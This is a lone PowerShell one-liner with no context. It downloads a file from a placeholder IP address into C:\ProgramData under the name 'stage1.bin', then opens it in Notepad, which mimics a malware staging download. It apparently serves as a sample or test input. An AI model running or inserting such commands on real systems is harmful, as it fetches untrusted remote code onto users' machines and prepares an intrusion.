
Invoke-WebRequest -Uri 'http://203.0.113.176:80/assets/update.dat' -OutFile 'C:\ProgramData\stage1.bin' -UseBasicParsing; Start-Process -FilePath "notepad.exe" -ArgumentList 'C:\ProgramData\stage1.bin'; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
